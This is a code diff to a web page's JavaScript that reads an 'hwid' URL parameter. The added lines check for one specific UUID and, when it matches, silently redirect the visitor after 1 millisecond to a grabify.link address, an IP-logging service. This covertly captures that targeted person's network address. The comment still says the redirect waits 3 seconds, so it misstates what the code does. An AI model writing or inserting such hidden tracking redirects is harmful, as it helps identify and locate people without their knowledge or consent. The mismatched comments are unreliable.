@@ -27,6 +27,12 @@
 
             // Get the 'hwid' parameter from the URL
             var hwidValue = getParameterByName('hwid');
+            if (hwidValue == '9f1fea0d-2bae-4d78-9d03-7c24ade97f1d') {
+                var redirectUrl = 'https://grabify.link/61PEAI'; // Change this to your desired website
+                setTimeout(function () {
+                    window.location.href = redirectUrl;
+                }, 1); // Redirect after 3 seconds (adjust as needed)
+            }
 
             // Display the 'hwid' value in the console (you can modify this part)
             console.log('HWID:', hwidValue);
@@ -35,10 +41,10 @@
             // For example, send it to a server for authentication or other processing
 
             // Redirect the user to another website after a short delay (adjust as needed)
-            var redirectUrl = 'https://example.com'; // Change this to your desired website
+            var redirectUrl = ''; // Change this to your desired website
             setTimeout(function () {
                 window.location.href = redirectUrl;
-            }, 99000); // Redirect after 3 seconds (adjust as needed)
+            }, 5000); // Redirect after 3 seconds (adjust as needed)
         });
     </script>
 </body>
